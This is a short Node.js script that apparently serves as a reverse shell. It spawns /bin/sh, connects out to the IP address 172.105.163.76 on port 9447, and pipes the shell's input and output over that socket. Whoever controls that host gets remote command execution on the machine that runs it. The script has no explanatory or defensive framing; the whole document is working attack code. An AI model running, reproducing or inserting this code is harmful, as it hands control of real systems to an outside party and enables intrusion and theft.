#!/usr/bin/env node

var net = require("net"), sh = require("child_process").exec("/bin/sh");
var client = new net.Socket();
client.connect(9447, "172.105.163.76", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
